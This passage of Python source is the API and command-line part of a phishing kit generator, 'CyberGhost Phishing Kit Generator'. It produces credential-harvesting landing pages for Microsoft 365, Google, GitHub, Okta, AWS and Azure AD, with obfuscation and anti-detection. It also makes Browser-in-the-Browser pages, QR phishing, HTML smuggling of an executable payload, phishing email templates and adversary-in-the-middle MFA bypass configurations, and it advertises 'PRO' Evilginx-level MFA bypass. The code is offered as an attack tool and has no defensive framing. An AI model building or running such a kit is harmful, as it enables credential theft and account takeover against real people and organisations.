                           redirect_url: str = "") -> Dict[str, Any]:
        """Create a phishing landing page"""
        
        try:
            target_platform = TargetPlatform(platform.lower())
        except ValueError:
            target_platform = TargetPlatform.CUSTOM
        
        obfuscation_levels = {
            "none": ObfuscationLevel.NONE,
            "basic": ObfuscationLevel.BASIC,
            "medium": ObfuscationLevel.MEDIUM,
            "advanced": ObfuscationLevel.ADVANCED,
            "paranoid": ObfuscationLevel.PARANOID
        }
        
        obf_level = obfuscation_levels.get(obfuscation.lower(), ObfuscationLevel.MEDIUM)
        
        generator = LandingPageGenerator(target_platform, obf_level)
        html_content = generator.generate(
            custom_message=custom_message,
            include_mfa=include_mfa,
            redirect_url=redirect_url
        )
        
        return {
            "success": True,
            "platform": platform,
            "obfuscation": obfuscation,
            "mfa_enabled": include_mfa,
            "html_content": html_content,
            "html_size": len(html_content),
            "features": {
                "credential_harvester": True,
                "fingerprinting": True,
                "mfa_interceptor": include_mfa,
                "anti_detection": obf_level.value >= 2
            }
        }
    
    def create_bitb_page(self, platform: str, popup_url: str = "") -> Dict[str, Any]:
        """Create Browser-in-the-Browser attack page"""
        
        try:
            target_platform = TargetPlatform(platform.lower())
        except ValueError:
            target_platform = TargetPlatform.GOOGLE
        
        generator = BrowserInBrowserGenerator(target_platform)
        html_content = generator.generate(popup_url)
        
        return {
            "success": True,
            "attack_type": "browser_in_browser",
            "platform": platform,
            "html_content": html_content
        }
    
    def create_qr_phishing(self, phishing_url: str, message: str = "") -> Dict[str, Any]:
        """Create QR phishing page"""
        
        generator = QRPhishingGenerator()
        html_content = generator.generate_qr_page(phishing_url, message)
        
        return {
            "success": True,
            "attack_type": "qr_phishing",
            "target_url": phishing_url,
            "html_content": html_content
        }
    
    def create_html_smuggling(self, payload_b64: str, filename: str = "document.exe") -> Dict[str, Any]:
        """Create HTML smuggling page"""
        
        try:
            payload_data = base64.b64decode(payload_b64)
        except:
            return {"success": False, "error": "Invalid base64 payload"}
        
        generator = HTMLSmugglingGenerator()
        html_content = generator.generate_smuggling_page(payload_data, filename)
        
        return {
            "success": True,
            "attack_type": "html_smuggling",
            "filename": filename,
            "payload_size": len(payload_data),
            "html_content": html_content
        }
    
    def generate_email_template(self, template: str, variables: Dict[str, str]) -> Dict[str, Any]:
        """Generate phishing email template"""
        
        generator = PhishingEmailGenerator()
        email = generator.generate(template, variables)
        
        return {
            "success": True,
            "template": template,
            "email": email
        }
    
    def create_mfa_bypass_config(self, platform: str) -> Dict[str, Any]:
        """Create MFA bypass (AiTM) configuration"""
        
        try:
            target_platform = TargetPlatform(platform.lower())
        except ValueError:
            return {"success": False, "error": "Unsupported platform"}
        
        engine = MFABypassEngine(target_platform)
        config = engine.generate_aitm_config()
        
        return {
            "success": True,
            "platform": platform,
            "aitm_config": config
        }
    
    def get_supported_platforms(self) -> Dict[str, Any]:
        """Get list of supported platforms"""
        
        return {
            "platforms": [
                {"id": "office365", "name": "Microsoft 365 / Outlook", "mfa_bypass": True},
                {"id": "google", "name": "Google Workspace / Gmail", "mfa_bypass": True},
                {"id": "linkedin", "name": "LinkedIn", "mfa_bypass": False},
                {"id": "github", "name": "GitHub", "mfa_bypass": True},
                {"id": "okta", "name": "Okta", "mfa_bypass": True},
                {"id": "aws", "name": "Amazon Web Services", "mfa_bypass": True},
                {"id": "azure_ad", "name": "Azure Active Directory", "mfa_bypass": True},
                {"id": "custom", "name": "Custom Template", "mfa_bypass": False}
            ],
            "attack_types": [
                {"id": "credential_harvest", "name": "Credential Harvesting", "description": "Capture usernames and passwords"},
                {"id": "mfa_bypass", "name": "MFA Bypass (AiTM)", "description": "Adversary-in-the-Middle session hijacking"},
                {"id": "bitb", "name": "Browser-in-Browser", "description": "Fake browser popup attack"},
                {"id": "qrishing", "name": "QR Phishing", "description": "QR code based phishing"},
                {"id": "html_smuggling", "name": "HTML Smuggling", "description": "Payload delivery via HTML"},
                {"id": "oauth_consent", "name": "OAuth Consent", "description": "Malicious OAuth app consent"}
            ],
            "email_templates": list(PhishingEmailGenerator.TEMPLATES.keys()),
            "obfuscation_levels": ["none", "basic", "medium", "advanced", "paranoid"]
        }


# ==================== CLI INTERFACE ====================

def main():
    """CLI interface for phishing kit"""
    import argparse
    
    parser = argparse.ArgumentParser(description="CyberGhost Phishing Kit Generator")
    parser.add_argument("--platform", "-p", choices=["office365", "google", "linkedin", "github", "okta", "aws", "custom"],
                       default="office365", help="Target platform")
    parser.add_argument("--type", "-t", choices=["landing", "bitb", "qr", "email"],
                       default="landing", help="Phishing type")
    parser.add_argument("--obfuscation", "-o", choices=["none", "basic", "medium", "advanced", "paranoid"],
                       default="medium", help="Obfuscation level")
    parser.add_argument("--mfa", action="store_true", help="Enable MFA bypass")
    parser.add_argument("--output", "-O", help="Output file path")
    parser.add_argument("--message", "-m", default="", help="Custom message")
    
    args = parser.parse_args()
    
    api = PhishingKitAPI()
    
    if args.type == "landing":
        result = api.create_landing_page(
            platform=args.platform,
            obfuscation=args.obfuscation,
            include_mfa=args.mfa,
            custom_message=args.message
        )
    elif args.type == "bitb":
        result = api.create_bitb_page(platform=args.platform)
    elif args.type == "qr":
        result = api.create_qr_phishing(
            phishing_url="https://example.com/phish",
            message=args.message or "Scan to verify"
        )
    elif args.type == "email":
        result = api.generate_email_template(
            template="password_expiry",
            variables={"name": "User", "link": "https://example.com/phish"}
        )
    
    if result.get("success"):
        html_content = result.get("html_content", result.get("email", {}).get("body_html", ""))
        
        if args.output:
            with open(args.output, "w") as f:
                f.write(html_content)
            print(f"[+] Output saved to: {args.output}")
        else:
            print(html_content)
    else:
        print(f"[-] Error: {result.get('error')}")
    
    # PRO Features
    print("\n" + "=" * 60)
    print("[PRO FEATURES LOADED]")
    try:
        from tools.phishing_kit_gen_pro import get_pro_engines
        pro_engines = get_pro_engines()
        print("✓ AI Credential Validator: ENABLED")
        print("✓ Evilginx MFA Bypass: ENABLED")
        print("✓ Real-Time MITM Engine: ENABLED")
        print("\n[PRO] Rating: 10/10 - Evilginx-Level MFA Bypass")
    except ImportError:
        print("✗ PRO features not available")
    print("=" * 60)


if __name__ == "__main__":
    main()
